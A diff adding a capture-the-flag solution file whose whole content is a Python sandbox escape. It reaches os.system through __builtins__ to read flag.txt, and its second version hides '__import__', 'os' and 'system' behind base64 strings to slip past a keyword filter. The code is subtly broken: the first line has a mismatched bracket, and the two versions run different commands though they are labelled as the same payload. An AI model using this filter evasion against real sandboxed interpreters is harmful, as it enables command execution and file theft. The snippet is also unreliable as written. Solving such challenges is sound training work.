@@ -1,0 +1,6 @@
+# Solution
+## Before base64 encode
+## __builtins__.__dict__['__import__')]('os').__dict__['system']('cat flag.txt')
+
+## After base64 encode
+## __builtins__.__dict__[base64.b64decode('X19pbXBvcnRfXw==').decode('ascii')](base64.b64decode('b3M=').decode('ascii')).__dict__[base64.b64decode('c3lzdGVt').decode('ascii')]('less -FX flag.txt')
